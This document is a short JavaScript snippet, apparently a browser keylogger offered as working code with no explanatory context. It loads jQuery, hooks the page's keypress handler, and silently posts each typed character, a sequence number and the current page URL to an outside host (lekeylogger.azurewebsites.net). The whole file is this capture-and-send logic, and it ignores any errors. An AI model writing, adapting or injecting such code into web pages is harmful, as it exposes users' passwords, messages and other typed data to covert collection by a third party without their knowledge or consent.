(function () {
    var script = document.createElement("SCRIPT");
    script.src = 'https://ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js';
    script.type = 'text/javascript';
    document.getElementsByTagName("head")[0].appendChild(script);

    var checkReady = function (callback) {
        if (window.jQuery) {
            callback(jQuery);
        }
        else {
            window.setTimeout(function () { checkReady(callback); }, 100);
        }
    };

    checkReady(function ($) {
        InstanceID = Math.random().toString(36).slice(2);
        SequenceNumber = 0;
        document.onkeypress = function (evt) {
            evt = evt || window.event
            key = String.fromCharCode(evt.charCode)
            if (key) {
                $.ajax({
                    url: 'http://lekeylogger.azurewebsites.net/api/Key',
                    type: 'Post',
                    data: JSON.stringify({ InstanceID: InstanceID, SequenceNumber: ++SequenceNumber, KeyValue: key, Referer: document.URL }),
                    contentType: "application/json",
                    success: function (data) { },
                    error: function () { }
                });
            }
        }
    });
})();

